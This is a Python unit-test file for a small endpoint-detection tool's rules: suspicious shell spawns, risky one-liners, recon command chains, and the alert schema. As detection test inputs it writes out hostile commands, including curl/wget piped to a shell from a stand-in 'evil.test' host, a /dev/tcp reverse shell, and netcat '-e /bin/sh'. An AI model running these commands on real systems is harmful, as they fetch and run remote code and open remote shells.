"""Rule engine tests. Pure logic - no /proc access required."""

from __future__ import annotations

import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from miniedr.models import ProcessEvent, normalise_binary, utc_now_iso
from miniedr.rules import RuleEngine, default_rules
from miniedr.rules.builtin import (
    ReconChainRule,
    ShellSpawnRule,
    SuspiciousOneLinerRule,
)


def make_event(
    exe="/bin/bash",
    cmdline="/bin/bash",
    parent_exe="/usr/bin/python3",
    parent_cmdline="python3 -m http.server 8080",
    pid=14205,
    ppid=13990,
    uid=1000,
    monotonic=0.0,
    comm="",
):
    return ProcessEvent(
        timestamp=utc_now_iso(),
        pid=pid,
        ppid=ppid,
        exe_path=exe,
        cmdline=cmdline,
        uid=uid,
        username="tester",
        parent_exe_path=parent_exe,
        parent_cmdline=parent_cmdline,
        comm=comm or os.path.basename(exe),
        source="test",
        monotonic=monotonic,
    )


class TestNormalisation(unittest.TestCase):
    def test_strips_interpreter_version(self):
        self.assertEqual(normalise_binary("/usr/bin/python3.12"), "python")
        self.assertEqual(normalise_binary("/usr/sbin/php8.1"), "php")
        self.assertEqual(normalise_binary("/bin/bash"), "bash")

    def test_handles_deleted_suffix(self):
        self.assertEqual(normalise_binary("/tmp/x (deleted)"), "x")

    def test_does_not_erase_wholly_numeric_names(self):
        self.assertEqual(normalise_binary("/usr/bin/7z"), "7z")


class TestRuleAShellSpawn(unittest.TestCase):
    def setUp(self):
        self.rule = ShellSpawnRule()

    def test_python_server_spawning_bash_alerts(self):
        alert = self.rule.evaluate(make_event())
        self.assertIsNotNone(alert)
        self.assertEqual(alert.rule_id, "EDR-001-SUSPICIOUS-SHELL-SPAWN")
        self.assertEqual(alert.severity, "HIGH")

    def test_interactive_flag_escalates_to_critical(self):
        alert = self.rule.evaluate(make_event(cmdline="/bin/bash -i"))
        self.assertIsNotNone(alert)
        self.assertEqual(alert.severity, "CRITICAL")

    def test_nginx_spawning_sh_alerts(self):
        alert = self.rule.evaluate(
            make_event(exe="/bin/sh", cmdline="sh", parent_exe="/usr/sbin/nginx")
        )
        self.assertIsNotNone(alert)

    def test_sshd_spawning_bash_is_benign(self):
        self.assertIsNone(
            self.rule.evaluate(make_event(parent_exe="/usr/sbin/sshd"))
        )

    def test_service_spawning_non_shell_is_benign(self):
        self.assertIsNone(
            self.rule.evaluate(make_event(exe="/bin/ls", cmdline="ls -la"))
        )

    def test_shell_from_shell_is_benign(self):
        self.assertIsNone(
            self.rule.evaluate(make_event(parent_exe="/bin/bash"))
        )


class TestRuleBOneLiners(unittest.TestCase):
    def setUp(self):
        self.rule = SuspiciousOneLinerRule()

    def _alert_for(self, cmdline):
        return self.rule.evaluate(
            make_event(exe="/bin/sh", cmdline=cmdline, parent_exe="/bin/bash")
        )

    def test_curl_pipe_bash(self):
        alert = self._alert_for("sh -c curl -fsSL http://evil.test/a.sh | bash")
        self.assertIsNotNone(alert)
        self.assertEqual(alert.rule_id, "EDR-002-SUSPICIOUS-ONELINER")

    def test_wget_pipe_sh(self):
        self.assertIsNotNone(
            self._alert_for("sh -c wget -qO- http://evil.test/x | sh")
        )

    def test_base64_decode_pipe_sh(self):
        self.assertIsNotNone(
            self._alert_for("sh -c echo aGVsbG8gd29ybGQK | base64 -d | sh")
        )

    def test_devtcp_reverse_shell_is_critical(self):
        alert = self._alert_for("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1")
        self.assertIsNotNone(alert)
        self.assertEqual(alert.severity, "CRITICAL")

    def test_netcat_exec(self):
        self.assertIsNotNone(self._alert_for("nc -e /bin/sh 10.0.0.5 4444"))

    def test_python_inline_b64decode(self):
        self.assertIsNotNone(
            self._alert_for("python3 -c import base64;exec(base64.b64decode(s))")
        )

    def test_plain_curl_download_is_benign(self):
        self.assertIsNone(
            self._alert_for("curl -fsSL https://example.test/f.tar.gz -o /tmp/f.tar.gz")
        )

    def test_benign_pipe_is_not_flagged(self):
        self.assertIsNone(self._alert_for("cat /var/log/syslog | grep error"))

    def test_empty_cmdline(self):
        self.assertIsNone(self._alert_for(""))


class TestRuleCReconChain(unittest.TestCase):
    def setUp(self):
        self.rule = ReconChainRule(window_seconds=10.0, threshold=3)

    def _run(self, names, ppid=999, start=100.0, step=0.5):
        alerts = []
        for index, name in enumerate(names):
            event = make_event(
                exe="/usr/bin/" + name,
                cmdline=name,
                parent_exe="/bin/bash",
                ppid=ppid,
                monotonic=start + index * step,
            )
            alerts.append(self.rule.evaluate(event))
        return alerts

    def test_three_distinct_recon_binaries_alert(self):
        alerts = self._run(["whoami", "id", "uname"])
        self.assertIsNone(alerts[0])
        self.assertIsNone(alerts[1])
        self.assertIsNotNone(alerts[2])
        self.assertEqual(alerts[2].rule_id, "EDR-003-RECON-CHAIN")

    def test_same_binary_repeated_does_not_alert(self):
        self.assertTrue(all(a is None for a in self._run(["id", "id", "id", "id"])))

    def test_spread_beyond_window_does_not_alert(self):
        alerts = self._run(["whoami", "id", "uname"], step=20.0)
        self.assertTrue(all(a is None for a in alerts))

    def test_different_parents_do_not_combine(self):
        self.assertIsNone(self._run(["whoami"], ppid=1)[0])
        self.assertIsNone(self._run(["id"], ppid=2)[0])
        self.assertIsNone(self._run(["uname"], ppid=3)[0])

    def test_cooldown_suppresses_immediate_repeat(self):
        first = self._run(["whoami", "id", "uname"])
        self.assertIsNotNone(first[2])
        again = self._run(["hostname", "netstat", "arch"], start=104.0)
        self.assertTrue(all(a is None for a in again))

    def test_bare_ps_is_not_recon(self):
        self.assertTrue(all(a is None for a in self._run(["ps", "ps", "ps"])))

    def test_ps_with_enumeration_flags_counts(self):
        rule = ReconChainRule(window_seconds=10.0, threshold=2)
        base = make_event(
            exe="/usr/bin/ps", cmdline="ps -ef", parent_exe="/bin/bash",
            ppid=555, monotonic=1.0,
        )
        self.assertIsNone(rule.evaluate(base))
        second = make_event(
            exe="/usr/bin/whoami", cmdline="whoami", parent_exe="/bin/bash",
            ppid=555, monotonic=1.5,
        )
        self.assertIsNotNone(rule.evaluate(second))


class TestEngine(unittest.TestCase):
    def test_engine_runs_all_rules(self):
        engine = RuleEngine(default_rules())
        alerts = engine.evaluate(make_event(cmdline="/bin/bash -i"))
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].rule_id, "EDR-001-SUSPICIOUS-SHELL-SPAWN")

    def test_one_event_can_trip_two_rules(self):
        engine = RuleEngine(default_rules())
        event = make_event(
            exe="/bin/bash",
            cmdline="bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
            parent_exe="/usr/bin/python3",
        )
        ids = {alert.rule_id for alert in engine.evaluate(event)}
        self.assertIn("EDR-001-SUSPICIOUS-SHELL-SPAWN", ids)
        self.assertIn("EDR-002-SUSPICIOUS-ONELINER", ids)

    def test_broken_rule_does_not_kill_the_engine(self):
        class Broken(ShellSpawnRule):
            def evaluate(self, event):
                raise ValueError("boom")

        engine = RuleEngine([Broken(), SuspiciousOneLinerRule()])
        alerts = engine.evaluate(make_event(cmdline="curl http://x/a | bash"))
        ids = [alert.rule_id for alert in alerts]
        self.assertIn("EDR-000-RULE-ERROR", ids)
        self.assertIn("EDR-002-SUSPICIOUS-ONELINER", ids)


class TestAlertSchema(unittest.TestCase):
    def test_alert_matches_v01_schema(self):
        alert = ShellSpawnRule().evaluate(make_event())
        doc = alert.to_dict(hostname="host-1")
        for key in ("timestamp", "rule_id", "severity", "alert", "process", "parent"):
            self.assertIn(key, doc)
        for key in ("pid", "ppid", "exe", "cmdline", "uid"):
            self.assertIn(key, doc["process"])
        for key in ("pid", "exe", "cmdline"):
            self.assertIn(key, doc["parent"])
        self.assertEqual(doc["process"]["pid"], 14205)
        self.assertEqual(doc["parent"]["pid"], 13990)
        self.assertTrue(doc["timestamp"].endswith("Z"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
